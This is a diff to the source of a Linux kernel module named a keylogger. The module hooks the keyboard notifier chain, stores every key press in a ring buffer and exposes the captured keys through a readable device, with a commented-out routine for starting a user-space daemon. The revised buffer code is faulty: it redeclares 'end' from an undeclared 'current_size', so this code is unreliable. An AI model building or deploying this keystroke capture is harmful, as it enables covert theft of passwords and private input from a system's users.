@@ -6,7 +6,6 @@
 #include <linux/keyboard.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
-//#include <linux/mutex.h>
 #include <linux/sched.h>
 #include <linux/poll.h>
 #include <linux/spinlock.h>
@@ -37,14 +36,14 @@ static unsigned char dev_buffer[BUFFER_LEN];
 static unsigned char* begin = dev_buffer;
 static unsigned char* end = dev_buffer;
 static unsigned char omittedKeys = 0;
-#define BUFSIZE (begin>end ? end-begin+BUFFER_LEN : end-begin)
-#define BUFFULL (BUFSIZE+1==BUFFER_LEN)
-#define BUFINFO printk(KERN_ALERT"Bufsize: %d\n",(int)BUFSIZE)
-#define BYTETOBUF(x) {*(end++)=x; if(end==dev_buffer+BUFFER_LEN)end=dev_buffer;}
-#define BUFCANSTORE (BUFFER_LEN-1-BUFSIZE)
+static unsigned short* end = current_size;
 
+#define BUFFER_SIZE current_size
+#define IS_BUFFER_FULL (BUFFER_SIZE == BUFFER_LEN)
+#define IS_BUFFER_EMPTY (BUFFER_SIZE == 0)
+#define BYTE_TO_BUFFER(x) {*(end++) = (unsigned char) x; if (end == dev_buffer + BUFFER_LEN) end = dev_buffer; current_size++;}
 
-// blocking read
+/* blocking read */
 static spinlock_t lock;
 static wait_queue_head_t waitq;
 
@@ -53,7 +52,6 @@ static int     device_open(struct inode *, struct file *);
 static int     device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
-//static unsigned int device_poll(struct file *, struct poll_table_struct *);
 
 static struct file_operations fops =
 {
@@ -61,15 +59,7 @@ static struct file_operations fops =
     .write = device_write,
     .open = device_open,
     .release = device_release,
-//	.poll = device_poll
 };
-
-//static unsigned int device_poll(struct file *filp, struct poll_table_struct *pt)
-//{
-//	unsigned int ret = 0;
-//	if (begin != end) ret = (POLLIN | POLLRDNORM);
-//	return ret;
-//}
 
 static int start_deamon(void)
 {
@@ -79,7 +69,7 @@ static int start_deamon(void)
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
- 	        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
 
     sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
     if (sub_info == NULL)
@@ -102,22 +92,21 @@ static int log_key(struct notifier_block *nblock, unsigned long code, void *_par
 
     spin_lock(&lock);
 
-    if (BUFCANSTORE >= 2)
+    if (BUFFER_LEN - BUFFER_SIZE >= 2)
     {
-        BYTETOBUF(param->down);
-        BYTETOBUF(param->value);
+        BYTE_TO_BUFFER(param->down);
+        BYTE_TO_BUFFER(param->value);
     }
     else if (omittedKeys < 255)
     {
         omittedKeys++;
     }
 
-    printk(KERN_ALERT "log_key %d\n", (int)(end-begin));
-    BUFINFO;
+    printk(KERN_ALERT "log_key %d\n", (int) (end-begin));
+    printk(KERN_ALERT "Bufsize: %d\n", (int) BUFFER_SIZE);
+
     spin_unlock(&lock);
     wake_up(&waitq);
-
-    
 
     return NOTIFY_OK;
 }
@@ -155,12 +144,9 @@ static int __init keylogger_init(void)
 
     register_keyboard_notifier(&nb);
     spin_lock_init(&lock);
-    mutex_init(&keyloggerDevice->mutex);
+    init_waitqueue_head(&waitq);
 
-	init_waitqueue_head(&waitq);
-
-
-    //start_deamon()
+    /* return start_deamon() */
     return 0;
 }
 
@@ -182,11 +168,9 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
     spin_lock(&lock);
     printk(KERN_ALERT "read: start\n");
 
-    while (begin == end) { /* nothing to read */
-//        spin_unlock(&lock); /* release the lock */
-//        if (filp->f_flags & O_NONBLOCK)
-//            return -EAGAIN;
-//        PDEBUG("\"%s\" reading: going to sleep\n", current->comm);
+    while (IS_BUFFER_EMPTY)
+    {
+        /* nothing to read */
         printk(KERN_ALERT "read: hanging\n");
         wait_event_lock_irq(waitq, (begin != end), lock);
         printk(KERN_ALERT "read: woke up\n");
@@ -194,18 +178,21 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
     printk(KERN_ALERT "read: reading...\n");
 
     /* copy data from the kernel data segment to the user data segment */
-    for (bytes_read = 0; begin != end && bytes_read <= length; ++bytes_read)
+    for (bytes_read = 0; begin != end && bytes_read <= length; ++bytes_read, --current_size)
     {
         put_user(*(begin++), buffer++);
-        if (begin == dev_buffer+BUFFER_LEN) begin = dev_buffer;
+        if (begin == dev_buffer + BUFFER_LEN)
+        {
+            begin = dev_buffer;
+        }
     }
 
     printk(KERN_ALERT "read: done. going out.\n");
 
-    if (omittedKeys && BUFCANSTORE >= 2)
+    if (omittedKeys && BUFFER_LEN - BUFFER_SIZE >= 2)
     {
-        BYTETOBUF(0xFF);
-        BYTETOBUF(omittedKeys);
+        BYTE_TO_BUFFER(0xFF);
+        BYTE_TO_BUFFER(omittedKeys);
         omittedKeys = 0;
     }
 
